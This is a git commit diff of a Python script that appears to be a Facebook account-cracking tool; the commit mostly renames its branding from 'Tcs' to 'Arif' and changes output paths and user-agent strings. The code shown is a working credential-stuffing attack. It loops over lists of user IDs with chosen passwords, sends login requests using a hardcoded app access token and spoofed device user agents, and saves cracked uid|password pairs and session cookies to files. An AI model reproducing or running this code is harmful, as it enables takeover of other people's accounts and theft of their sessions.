275125bbcd3343462b74962f3603f71f6df6e62a
arif-143 <158057368+arif-143@users.noreply.github.com>
2024-01-31 14:19:50 +0600

    Add files via upload

--- ag.py
+++ ag.py
@@ -163,7 +163,7 @@ def Main():
     else:Main()
 #-----------------------[ FILE-CODE ]-----------------------#
 def file():
-    fresh();print(" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFOR EXAMPLE: \x1b[38;5;46m/sdcard/TCS.txt");line()
+    fresh();print(" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFOR EXAMPLE: \x1b[38;5;46m/sdcard/Arif.txt");line()
     file = input(" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mPUT FILE PATH : ")
     try:
         fo = open(file,'r').read().splitlines()
@@ -172,7 +172,7 @@ def file():
     fresh();print('\x1b[38;5;196m[\x1b[38;5;46m1\x1b[38;5;196m]\x1b[38;5;46mMethod \x1b[1;97m')
     print('\x1b[38;5;196m[\x1b[38;5;46m2\x1b[38;5;196m]\x1b[38;5;46mMethod \x1b[1;97m')
     print('\x1b[38;5;196m[\x1b[38;5;46m3\x1b[38;5;196m]\x1b[38;5;46mMethod \x1b[1;97m');line()
-    Tcs_x=input("\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mCHOOSE : ")
+    Arif_x=input("\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mCHOOSE : ")
     plist=[]
     fresh()
     try:
@@ -184,22 +184,22 @@ def file():
     line()
     for i in range(ps_limit):
         plist.append(input(f" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mPUT PASSWORD\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m|"%(i+1)))
-    with tred(max_workers=30) as Tcs:
+    with tred(max_workers=20) as Arif:
         fresh()
         tl = str(len(fo))
         print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mTOTAL IDS \x1b[1;97m● {tl}')
-        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mMETHOD \x1b[1;97m● \x1b[1;97mM{Tcs_x}\x1b[38;5;46m')
+        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mMETHOD \x1b[1;97m● \x1b[1;97mM{Arif_x}\x1b[38;5;46m')
         print(f" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFIRST \x1b[38;5;196m[\x1b[1;97mON\x1b[38;5;196m/\033[38;5;196mOFF\x1b[38;5;196m] \x1b[1;97mAIRPLANE MODE")
         line()
         for user in fo:
             ids,names = user.split('|')
             passlist = plist
-            if Tcs_x =='1':
-                Tcs.submit(api1,ids,names,passlist)
-            if Tcs_x =='2':
-                Tcs.submit(api2,ids,names,passlist)
-            if Tcs_x =='3':
-                Tcs.submit(api3,ids,names,passlist)
+            if Arif_x =='1':
+                Arif.submit(api1,ids,names,passlist)
+            if Arif_x =='2':
+                Arif.submit(api2,ids,names,passlist)
+            if Arif_x =='3':
+                Arif.submit(api3,ids,names,passlist)
 #-----------------------[ FILE-METHOD-CODE ]-----------------------#
 def api1(ids,names,passlist):
     try:
@@ -229,8 +229,8 @@ def api1(ids,names,passlist):
                     cookie = f"sb={ssbb};{ckkk}"
                     print('\r\r\x1b[38;5;196m[\x1b[38;5;46mTcs\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                     #line()
-                    file_path = os.path.join(folder_path, 'Tcs-FILE-OK.txt')
-                    open('/sdcard/Tcs/Tcs-FILE-OK-COOKIE-M1.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
+                    file_path = os.path.join(folder_path, 'Arif-FILE-OK.txt')
+                    open('/sdcard/Arif/Arif-FILE-OK-COOKIE-M1.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+'|'+pas+'\n')
                     oks.append(uid)
@@ -239,7 +239,7 @@ def api1(ids,names,passlist):
                     uid = str(po['error']['error_data']['uid'])
                     print(f'\r\r\33[1m\33[1;35m [BOT-CP] '+uid+' | '+pas+'\033[1;97m')
                     file_path = os.path.join(folder_path, 'BOT-FILE-CP.txt')
-                    open('/sdcard/Tcs-CP.txt','a').write(uid+'|'+pas+'\n')
+                    open('/sdcard/Jarin-CP.txt','a').write(uid+'|'+pas+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+'|'+pas+'\n')
                     cps.append(uid)
@@ -268,7 +268,7 @@ def api2(ids,names,passlist):
             fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
             fbbv = str(random.randint(000000000,999999999))
             accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/364.0.0.24.132;FBBV/366458633;FBDM/{density=2.625,width=1080,height=2133};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S901U;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
+            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/58.0.0.5380;FBBV/8069994;FBDM/{density=3,width=720,height=1280};FBLC/en_US;FBRV/8555844;FBCR/null;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.adsmanager;FBDV/6;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
             head = {'User-Agent':uaddx,
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
@@ -310,19 +310,19 @@ def api2(ids,names,passlist):
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
-                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mTCS\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
+                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mARIF\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                     #line()
-                    file_path = os.path.join(folder_path, 'Tcs-FILE-OK.txt')
-                    open('/sdcard/Tcs/Tcs-FILE-OK-COOKIE-M2.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
+                    file_path = os.path.join(folder_path, 'Arif-FILE-OK.txt')
+                    open('/sdcard/Arif/ARIF-FILE-OK-COOKIE-M2.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+'|'+pas+'\n')
                     oks.append(uid)
                     break
             elif 'www.facebook.com' in po['error']['message']:
                     uid = str(po['error']['error_data']['uid'])
-                    print(f'\r\r\33[1m\33[1;35m [TCS-CP] '+uid+' | '+pas+'\033[1;97m')
+                    print(f'\r\r\33[1m\33[1;35m [ARIF-CP] '+uid+' | '+pas+'\033[1;97m')
                     file_path = os.path.join(folder_path, 'BOT-FILE-CP.txt')
-                    open('/sdcard/Tcs-CP.txt','a').write(uid+'|'+pas+'\n')
+                    open('/sdcard/Jarin-CP.txt','a').write(uid+'|'+pas+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+'|'+pas+'\n')
                     cps.append(uid)
@@ -350,7 +350,7 @@ def api3(ids,names,passlist):
             fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
             fbbv = str(random.randint(000000000,999999999))
             accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-            uaddx = f'[lFBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/26.0.0.7632;FBBV/5040004;FBDM/{density= ,width=720,height=1280};FBLC/en_US;FBRV/2910990;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.adsmanager;FBDV/y21;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+            uaddx = f'[lFBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/75.0.0.5078;FBBV/3775548;FBDM/{density=],width=720,height=1280};FBLC/en_US;FBRV/3807887;FBCR/null;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.lite;FBDV/6;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
             head = {'User-Agent':uaddx,
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
@@ -394,8 +394,8 @@ def api3(ids,names,passlist):
                     cookie = f"sb={ssbb};{ckkk}"
                     print('\r\r\x1b[38;5;196m[\x1b[38;5;46mTcs\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                     #line()
-                    file_path = os.path.join(folder_path, 'Tcs-FILE-OK.txt')
-                    open('/sdcard/Tcs/Tcs-FILE-OK-COOKIE-M3.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
+                    file_path = os.path.join(folder_path, 'ARIF-FILE-OK.txt')
+                    open('/sdcard/Arif/Arif-FILE-OK-COOKIE-M3.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+'|'+pas+'\n')
                     oks.append(uid)
@@ -404,7 +404,7 @@ def api3(ids,names,passlist):
                     uid = str(po['error']['error_data']['uid'])
                     print(f'\r\r\33[1m\33[1;35m [BOT-CP] '+uid+' | '+pas+'\033[1;97m')
                     file_path = os.path.join(folder_path, 'BOT-FILE-CP.txt')
-                    open('/sdcard/Tcs-CP.txt','a').write(uid+'|'+pas+'\n')
+                    open('/sdcard/Jarin-CP.txt','a').write(uid+'|'+pas+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+'|'+pas+'\n')
                     cps.append(uid)
@@ -526,7 +526,7 @@ def aproval():
             Main()
             pass
         else:
-            print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mYOUER KEY : Tcs{id}Cyber')
+            print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mYOUER KEY : ARIF{id}Cyber')
             line()
             print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFREE APROVAL PERSONAL USER ')
             line()
